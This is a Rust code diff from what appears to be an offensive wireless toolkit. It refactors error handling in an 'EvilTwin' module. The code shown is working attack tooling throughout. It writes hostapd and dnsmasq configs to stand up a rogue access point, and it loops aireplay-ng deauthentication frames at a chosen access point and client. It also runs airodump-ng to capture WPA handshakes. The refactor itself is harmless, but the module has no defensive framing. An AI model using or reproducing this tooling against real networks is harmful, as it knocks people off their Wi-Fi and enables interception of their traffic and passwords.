@@ -1,3 +1,4 @@
+use kraken_errors::WirelessError;
 use serde::{Deserialize, Serialize};
 use std::fs;
 use std::process::Command;
@@ -88,19 +89,19 @@ impl EvilTwin {
         )
     }
 
-    pub fn start_ap(config: &EvilTwinConfig) -> Result<EvilTwinStatus, String> {
+    pub fn start_ap(config: &EvilTwinConfig) -> Result<EvilTwinStatus, WirelessError> {
         let hostapd_conf = Self::create_hostapd_config(config);
         let dnsmasq_conf = Self::create_dnsmasq_config(&config.interface, "192.168.1.1");
 
         fs::write("/tmp/hostapd.conf", &hostapd_conf)
-            .map_err(|e| format!("Failed to write hostapd config: {}", e))?;
+            .map_err(|e| WirelessError::Io(std::io::Error::new(std::io::ErrorKind::Other, format!("Failed to write hostapd config: {}", e))))?;
         fs::write("/tmp/dnsmasq.conf", &dnsmasq_conf)
-            .map_err(|e| format!("Failed to write dnsmasq config: {}", e))?;
+            .map_err(|e| WirelessError::Io(std::io::Error::new(std::io::ErrorKind::Other, format!("Failed to write dnsmasq config: {}", e))))?;
 
         Command::new("ip")
             .args(["link", "set", &config.interface, "up"])
             .output()
-            .map_err(|e| format!("Failed to bring up interface: {}", e))?;
+            .map_err(|e| WirelessError::Command(format!("Failed to bring up interface: {}", e)))?;
 
         Command::new("ip")
             .args(["addr", "add", "192.168.1.1/24", "dev", &config.interface])
@@ -128,17 +129,17 @@ impl EvilTwin {
                     deauth_sent: 0,
                 })
             }
-            Err(e) => Err(format!("Failed to start hostapd: {}", e)),
+            Err(e) => Err(WirelessError::Command(format!("Failed to start hostapd: {}", e))),
         }
     }
 
-    pub fn send_deauth(interface: &str, bssid: &str, client: &str, count: u32) -> Result<u32, String> {
+    pub fn send_deauth(interface: &str, bssid: &str, client: &str, count: u32) -> Result<u32, WirelessError> {
         let mut sent = 0;
         for _ in 0..count {
             let output = Command::new("aireplay-ng")
                 .args(["--deauth", "1", "-a", bssid, "-c", client, interface])
                 .output()
-                .map_err(|e| format!("deauth failed: {}", e))?;
+                .map_err(|e| WirelessError::Command(format!("deauth failed: {}", e)))?;
 
             if output.status.success() {
                 sent += 1;
@@ -147,11 +148,11 @@ impl EvilTwin {
         Ok(sent)
     }
 
-    pub fn capture_handshake(interface: &str, bssid: &str, output: &str) -> Result<String, String> {
+    pub fn capture_handshake(interface: &str, bssid: &str, output: &str) -> Result<String, WirelessError> {
         let mut child = Command::new("airodump-ng")
             .args(["--bssid", bssid, "-w", output, interface])
             .spawn()
-            .map_err(|e| format!("airodump-ng failed: {}", e))?;
+            .map_err(|e| WirelessError::Command(format!("airodump-ng failed: {}", e)))?;
 
         std::thread::sleep(std::time::Duration::from_secs(10));
 
@@ -160,7 +161,7 @@ impl EvilTwin {
         Ok(format!("{}.cap", output))
     }
 
-    pub fn stop_ap(interface: &str) -> Result<(), String> {
+    pub fn stop_ap(interface: &str) -> Result<(), WirelessError> {
         Command::new("pkill")
             .args(["hostapd"])
             .output()
